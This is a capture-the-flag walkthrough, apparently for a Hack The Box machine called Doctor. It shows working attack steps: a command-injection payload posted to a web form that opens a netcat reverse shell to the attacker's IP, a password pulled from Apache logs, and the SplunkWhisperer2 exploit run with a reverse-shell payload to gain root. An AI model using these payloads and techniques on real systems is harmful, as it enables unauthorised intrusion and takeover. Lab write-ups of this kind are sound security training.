# DOCTOR

## IP =  10.10.10.209 

First of all (like always) I launch nmap:

```
sudo nmap -Pn -A -T5  10.10.10.209 
[sudo] password for kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-30 08:19 EST
Nmap scan report for 10.10.10.209
Host is up (0.13s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (92%), Linux 5.0 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 , Linux 5.4 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   133.98 ms 10.10.14.1
2   134.07 ms 10.10.10.209

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.70 seconds
```

It turns out there are 22, 80 and 8089 opened. After a quick look at 80 I see a website with many details, images etc. There is one thing which catches my atttention - email address.

`info@htb.com`

I thought about adding machin's IP to `/etc/hosts` :

```
$ vim /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.10.209    doctors.htb
```

Once done, I access `doctors.htb` and website redirects me to a login panel. There is also a possibility to register a new account, so I do it. After creation of new account, I can write a new message, so that could be a way to get a shell with netcat.

I was stuck here so after a quick research, I type:
`<img src=http://10.10.14.206/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.206'$IFS'1234')>`

in Content section and launch netcat listener `sudo nc -lvnp 1234` before clicking Post.

I get an access and also switch to interactive shell:

```
 sudo nc -lvnp 1234                                                                                             1 ⨯
listening on [any] 1234 ...
connect to [10.10.14.206] from (UNKNOWN) [10.10.10.209] 37046

id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)

whoami
web

python3 -c 'import pty;pty.spawn("/bin/bash")' 

web@doctor:~$ pwd
pwd
/home/web

web@doctor:~$ cd ..
cd ..

web@doctor:/home$ ls
ls
shaun  web

web@doctor:/home$ cd shaun
cd shaun/

web@doctor:/home/shaun$ ls
ls
user.txt

web@doctor:/home/shaun$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
web@doctor:/home/shaun$ id
id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
```

I find out two folders - web and shaun. In shaun there is user flag, however we have no permission to view it.

After some time of searching, I check apache2 logs and notice there is a file called `backup` which contains lots of logs:
```
web@doctor:~/blog$ cd /var/log/apache2
cd /var/log/apache2
web@doctor:/var/log/apache2$ ls
ls
access.log        access.log.5.gz  error.log.10.gz  error.log.5.gz
access.log.1      access.log.6.gz  error.log.11.gz  error.log.6.gz
access.log.10.gz  access.log.7.gz  error.log.12.gz  error.log.7.gz
access.log.11.gz  access.log.8.gz  error.log.13.gz  error.log.8.gz
access.log.12.gz  access.log.9.gz  error.log.14.gz  error.log.9.gz
access.log.2.gz   backup           error.log.2.gz   other_vhosts_access.log
access.log.3.gz   error.log        error.log.3.gz
access.log.4.gz   error.log.1      error.log.4.gz

web@doctor:/var/log/apache2$ cd backup
cd backup
bash: cd: backup: Not a directory

web@doctor:/var/log/apache2$ cat backup
10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] "\x16\x03" 400 0 "-" "-"
10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] "t3 12.1.2\n" 400 0 "-" "-"
10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] "PROPFIND / HTTP/1.1" 405 521 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] "GET /.git/HEAD HTTP/1.1" 404 453 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
```

nd apparently recently modified password
```
web@doctor:/var/log/apache2$ grep -r password?email
grep -r password?email                                                                                                                              
backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
access.log:10.10.14.52 - - [30/Dec/2020:10:17:47 +0100] "GET /reset_password?email=Guitar123 HTTP/1.1" 200 1861 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
access.log:10.10.14.52 - - [30/Dec/2020:12:52:13 +0100] "GET /home HTTP/1.1" 302 765 "http://doctors.htb/reset_password?email=Guitar123" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
access.log:10.10.14.52 - - [30/Dec/2020:12:52:14 +0100] "GET /login?next=%2Fhome HTTP/1.1" 200 2000 "http://doctors.htb/reset_password?email=Guitar123" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
```

Let's check if it matches with our user `shaun`

```
web@doctor:/var/log/apache2$ su - shaun
su - shaun
Password: Guitar123
```

Bingo:

```
shaun@doctor:~$ ls
ls
user.txt
shaun@doctor:~$ cat user
cat user.txt 
*********
```

Another step is to escalate to root. It seems that on port 8089 there is a running `splunk 8.0.5`. After some research, I find an exploit on `https://github.com/cnotin/SplunkWhisperer2`

Final command with payload is:
`python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.206 --username shaun --password Guitar123 --payload 'nc.traditional -e/bin/sh '10.10.14.206' '1234''`

```
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpm9lefgn2.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.206:8181/
10.10.10.209 - - [30/Dec/2020 09:57:18] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!
```

I ran netcat in another window and bingo, we are root:
```
$ sudo nc -lvnp 4444                                                                                             1 ⨯
listening on [any] 4444 ...
connect to [10.10.14.206] from (UNKNOWN) [10.10.10.209] 49468

whoami
root
python3 -c 'import pty;pty.spawn("/bin/bash")'  

root@doctor:/# ls -la

root@doctor:cd /root
cd /root

root@doctor:/root# ls -lah
ls -lah
total 44K
drwx------  7 root root 4,0K Sep 22 12:02 .
drwxr-xr-x 20 root root 4,0K Sep 15 12:51 ..
lrwxrwxrwx  1 root root    9 Jul 26 14:25 .bash_history -> /dev/null
-rw-r--r--  1 root root 3,1K Dez  5  2019 .bashrc
drwx------  3 root root 4,0K Aug 18 12:55 .cache
drwx------  4 root root 4,0K Jul 27 20:32 .config
drwx------  3 root root 4,0K Jul 27 20:32 .dbus
drwx------  3 root root 4,0K Sep  6 17:09 .gnupg
drwxr-xr-x  3 root root 4,0K Jul 21 19:17 .local
-rw-r--r--  1 root root  161 Dez  5  2019 .profile
-r--------  1 root root   33 Dez 30 06:53 root.txt
-rw-r--r--  1 root root   66 Sep 22 12:02 .selected_editor

root@doctor:/root# cat root.txt 
cat root.txt
***********
```

Mission accomplished :)

